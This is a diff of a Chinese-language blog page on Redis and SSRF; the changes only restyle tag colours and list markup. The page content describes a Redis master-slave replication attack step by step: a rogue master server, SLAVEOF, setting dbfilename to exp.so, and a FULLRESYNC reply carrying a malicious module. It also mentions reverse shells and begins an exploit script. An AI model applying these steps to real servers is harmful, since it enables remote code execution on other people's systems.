@@ -260,12 +260,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Redis/" style="color: #ffa2c4">Redis</a>
+                <a href="/blog/tags/Redis/" style="color: #00bcd4">Redis</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/SSRF/" style="color: #ff7d73">SSRF</a>
+                <a href="/blog/tags/SSRF/" style="color: #00a596">SSRF</a>
             </span>
             
         </span>
@@ -464,7 +464,8 @@ redis-cli -p 6379
 <p>有两种模式，一种是交互式shell，一种是反弹shell</p>
 <hr>
 <h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
-<li><p>配置一个我们需要以 master 身份给 slave 传输 so 文件的服务</p>
+<li>配置一个我们需要以 master 身份给 slave 传输 so 文件的服务</li>
+</ol>
 <pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">PING 测试连接是否可用
 +PONG 告诉slave连接可用
 REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
@@ -472,16 +473,22 @@ REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
 REPLCONF 发送REPLCONF capa
 +OK 告诉slave成功接受
 PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>将要攻击的 redis 服务器设置成我们的 slave</p>
-<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">SLAVEOF ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</li>
-<li><p>设置 RDB 文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用 <code>config set dir path</code>）</p>
-<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">config set dbfilename exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</li>
-<li><p>告诉 slave 使用全量复制并从我们配置的 Rouge Server 接收 module（其中 <code>&lt;runid&gt;</code> 无要求，不过长度一般为40，<code>&lt;offest&gt;</code> 一般设置为1）</p>
-<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+
+<ol start="2">
+<li>将要攻击的 redis 服务器设置成我们的 slave</li>
 </ol>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">SLAVEOF ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>设置 RDB 文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用 <code>config set dir path</code>）</li>
+</ol>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">config set dbfilename exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li>告诉 slave 使用全量复制并从我们配置的 Rouge Server 接收 module（其中 <code>&lt;runid&gt;</code> 无要求，不过长度一般为40，<code>&lt;offest&gt;</code> 一般设置为1）</li>
+</ol>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 <h2 id="某exp"><a href="#某exp" class="headerlink" title="某exp"></a>某exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
 <span class="token keyword">import</span> time
